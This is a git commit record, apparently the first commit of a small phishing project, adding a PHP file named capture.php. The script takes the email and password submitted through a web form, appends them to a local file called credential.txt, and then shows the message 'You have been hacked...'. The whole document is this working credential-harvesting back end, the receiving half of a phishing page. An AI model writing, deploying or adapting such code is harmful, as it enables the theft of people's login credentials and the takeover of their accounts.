dc0f119efd11c9c6016df9eec806b52197446581
root <root@jack.jack>
2020-08-04 17:18:15 -0400

    first commit

---
+++ capture.php
@@ -0,0 +1,9 @@
+<?php
+$email = $_POST['email'];
+$password = $_POST['password'];
+$file = fopen('credential.txt','a');
+fwrite($file,"username = ".$email."\n");
+fwrite($file,"password = ".$password."\n");
+fclose($file);
+echo "<h1>You have been hacked...</h1>"
+?>
